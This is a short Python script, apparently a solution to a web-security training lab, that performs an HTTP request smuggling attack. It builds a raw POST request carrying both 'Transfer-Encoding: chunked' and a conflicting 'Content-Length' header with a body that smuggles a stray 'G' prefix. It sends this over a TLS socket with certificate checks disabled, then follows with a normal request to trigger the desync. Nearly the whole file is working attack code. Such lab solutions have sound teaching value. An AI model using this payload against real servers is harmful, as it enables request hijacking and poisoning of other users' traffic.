import sys
import ssl
import socket
import logging
import urllib3
from urllib.parse import urlparse

import requests       # HTTP request smuggling require build custom requests with multiple request in python socket

from utils import utils # script copied from YouTube Channel: @tjc_  https://youtu.be/1IoFrIxrzXA

from utils.blog import Blog


log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def create_request_text(host):
    body = "0\r\n\r\nG"

    request_text = ""
    request_text += "POST / HTTP/1.1\r\n"
    request_text += f"Host: {host}\r\n"
    request_text += "Transfer-Encoding: chunked\r\n"
    request_text += f"Content-Length: {str(len(body))}\r\n"
    request_text += "\r\n"
    request_text += body
    return request_text
    

def send_request(request_text, host, port):
    # Context SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE # ignore certificate errors
    # socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock = context.wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    sock.sendall(request_text.encode())
    sock.close()


def main(args):
    blog = Blog(args.url, args.no_proxy)
    parsed_url = urlparse(blog.base_url)
    port = parsed_url.port
    if port is None:
        if parsed_url.scheme == "https":
            port = 443
        if parsed_url.scheme == "http":
            port = 80
    host = parsed_url.netloc               # urlparse. netloc is the name of the server (ip address or host name)
    request_text = create_request_text(host)
    print(request_text)
    send_request(request_text, host, port)
    resp = requests.post(blog.base_url, proxies=utils.PROXIES, verify=False)
    print(resp)
    blog.is_solved()


if __name__ == "__main__":          # credit for this code go to @tjc_   
    args = utils.parse_args(sys.argv)
    main(args)
